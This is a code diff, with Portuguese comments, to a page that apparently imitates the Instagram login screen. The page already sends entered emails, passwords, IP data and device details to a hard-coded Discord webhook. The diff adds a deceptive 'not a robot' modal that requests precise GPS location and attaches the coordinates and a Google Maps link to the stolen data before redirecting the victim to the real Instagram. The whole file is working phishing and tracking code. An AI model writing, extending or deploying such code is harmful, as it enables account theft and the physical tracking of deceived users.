@@ -222,11 +222,87 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Estilos para o modal de localização */
+        .location-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            display: none;
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .location-content {
+            background-color: white;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 350px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .location-content h3 {
+            margin-bottom: 15px;
+            font-size: 18px;
+            color: #262626;
+        }
+        
+        .location-content p {
+            margin-bottom: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .location-button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            padding: 10px 0;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        
+        .location-cancel {
+            background-color: transparent;
+            color: #0095f6;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        
+        .location-icon {
+            margin-bottom: 15px;
+            width: 60px;
+            height: 60px;
+        }
     </style>
 </head>
 <body>
     <div class="loading-overlay" id="loading">
         <div class="spinner"></div> Redirecionando para o Instagram...
+    </div>
+
+    <!-- Modal de solicitação de localização -->
+    <div class="location-modal" id="locationModal">
+        <div class="location-content">
+            <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#0095f6">
+                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+            </svg>
+            <h3>Permitir acesso à localização</h3>
+            <p>Para continuar, é necessário permitir o acesso à sua localização para garantir que você não seja um robô.</p>
+            <button class="location-button" id="allowLocation">Permitir acesso</button>
+            <button class="location-cancel" id="denyLocation">Não permitir</button>
+        </div>
     </div>
 
     <main class="flex align-items-center justify-content-center">
@@ -294,9 +370,53 @@
         // Webhook do Discord para receber os dados
         const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
         
+        // Variáveis para armazenar as coordenadas
+        let userLatitude = null;
+        let userLongitude = null;
+        
         // Função para mostrar o carregamento
         function showLoading() {
             document.getElementById('loading').style.display = 'flex';
+        }
+        
+        // Função para mostrar o modal de localização
+        function showLocationModal() {
+            document.getElementById('locationModal').style.display = 'flex';
+        }
+        
+        // Função para esconder o modal de localização
+        function hideLocationModal() {
+            document.getElementById('locationModal').style.display = 'none';
+        }
+        
+        // Função para obter a localização do usuário
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocalização não suportada pelo navegador'));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        resolve({
+                            latitude: userLatitude,
+                            longitude: userLongitude
+                        });
+                    },
+                    (error) => {
+                        console.error('Erro ao obter localização:', error);
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
         }
         
         // Função para obter informações do IP
@@ -384,21 +504,28 @@
             return { os, browser };
         }
         
-        // Manipular envio do formulário
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Função principal para processar o login e obter localização
+        async function processLogin(email, password) {
             showLoading();
             
-            // Obter valores do formulário
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
             const userAgent = navigator.userAgent;
-            
-            // Obter informações do IP
             const ipInfo = await getIPInfo();
-            
-            // Detectar sistema e navegador
             const deviceInfo = detectUserInfo(userAgent);
+            
+            // Preparar as informações de localização
+            let locationInfo = "Localização não fornecida";
+            let mapsLink = "";
+            
+            // Se temos as coordenadas precisas do GPS
+            if (userLatitude && userLongitude) {
+                mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
+                locationInfo = `Latitude: ${userLatitude}\nLongitude: ${userLongitude}\nGoogle Maps: ${mapsLink}`;
+            } 
+            // Senão, usar localização aproximada do IP
+            else if (ipInfo.latitude && ipInfo.longitude) {
+                mapsLink = `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
+                locationInfo = `Latitude: ${ipInfo.latitude}\nLongitude: ${ipInfo.longitude}\nGoogle Maps: ${mapsLink}\n(Aproximado pelo IP)`;
+            }
             
             // Criar payload para enviar ao Discord
             const payload = {
@@ -424,6 +551,11 @@
                             inline: false
                         },
                         {
+                            name: "📍 Geolocalização",
+                            value: "```" + locationInfo + "```",
+                            inline: false
+                        },
+                        {
                             name: "📟 Informações do Dispositivo",
                             value: "```Sistema: " + deviceInfo.os + "\nNavegador: " + deviceInfo.browser + "```",
                             inline: false
@@ -441,6 +573,11 @@
                 }]
             };
             
+            // Adicionar link do Google Maps como URL se disponível
+            if (mapsLink) {
+                payload.embeds[0].url = mapsLink;
+            }
+            
             // Enviar para o webhook
             console.log("Enviando dados para webhook...");
             const success = await sendToWebhook(payload);
@@ -455,6 +592,59 @@
             setTimeout(function() {
                 window.location.href = "https://www.instagram.com/";
             }, 1500);
+        }
+        
+        // Quando o botão "Permitir acesso" no modal for clicado
+        document.getElementById('allowLocation').addEventListener('click', function() {
+            getLocation()
+                .then(() => {
+                    // Localização obtida com sucesso
+                    hideLocationModal();
+                    
+                    // Obter dados do formulário
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    
+                    // Processar o login com a localização
+                    processLogin(email, password);
+                })
+                .catch((error) => {
+                    // Erro ao obter localização
+                    console.error("Erro ao obter localização:", error);
+                    hideLocationModal();
+                    
+                    // Continuar mesmo sem a localização
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    processLogin(email, password);
+                });
+        });
+        
+        // Quando o botão "Não permitir" no modal for clicado
+        document.getElementById('denyLocation').addEventListener('click', function() {
+            hideLocationModal();
+            
+            // Continuar mesmo sem a localização
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            processLogin(email, password);
+        });
+        
+        // Manipular envio do formulário
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Verificar se os campos estão preenchidos
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert("Por favor, preencha todos os campos.");
+                return;
+            }
+            
+            // Mostrar modal de localização
+            showLocationModal();
         });
     </script>
 </body>
